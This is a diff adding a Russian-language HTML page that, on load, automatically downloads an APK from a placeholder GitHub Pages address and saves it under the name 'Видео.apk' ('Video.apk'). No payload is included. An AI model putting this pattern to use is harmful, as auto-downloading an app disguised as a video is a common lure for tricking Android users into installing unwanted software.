@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <title>Начало загрузки</title>
+    
+    <style>
+        body { 
+            font-family: sans-serif; 
+            text-align: center; 
+            padding-top: 50px; 
+            background-color: #f0f0f0; 
+            color: #333;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        .spinner { 
+            border: 8px solid #f3f3f3; 
+            border-top: 8px solid #3498db; 
+            border-radius: 50%; 
+            width: 60px; 
+            height: 60px; 
+            animation: spin 1.5s linear infinite; 
+            margin: 20px auto; 
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+        a {
+            color: #3498db;
+            text-decoration: none;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <h1>Подготовка к загрузке...</h1>
+        <p>Начало загрузки файла <span id="filename">Видео.apk</span>.</p>
+        <p>Если загрузка не началась автоматически, нажмите <a id="manual_link" href="#">здесь</a>.</p>
+    </div>
+    
+    <script>
+        // --- 🔑 КЛЮЧЕВАЯ КОНФИГУРАЦИЯ ---
+        
+        // 1. Укажите полный URL вашего APK-файла (ЗАМЕНИТЕ АДРЕС!)
+        const repoBaseUrl = 'https://username.github.io/repo-name/'; 
+        const apkUrl = repoBaseUrl + 'downloads/test.apk'; 
+        const apkFilename = 'Видео.apk'; 
+        
+        // ------------------------------------
+
+        // 2. Функция для запуска скачивания
+        function startDownload() {
+            // Создаем невидимую ссылку (<a>) в DOM
+            const link = document.createElement('a');
+            link.href = apkUrl;
+            link.download = apkFilename; 
+            
+            // "Кликаем" по ссылке, что инициирует диалог скачивания APK (как на {D241F94D-1735-495F-AB94-DBE756D001AB}.png)
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            // Обновляем страницу после начала скачивания
+            document.querySelector('h1').textContent = "Загрузка началась!";
+            document.querySelector('.spinner').style.display = 'none';
+        }
+
+        // 3. Запускаем скачивание сразу после загрузки страницы
+        window.onload = function() {
+            // Устанавливаем ссылку для ручного скачивания
+            document.getElementById('manual_link').href = apkUrl;
+            document.getElementById('filename').textContent = apkFilename;
+            
+            // Запускаем автоматическое скачивание через небольшую задержку (0.5 секунды)
+            setTimeout(startDownload, 500); 
+        };
+    </script>
+</body>
+</html>
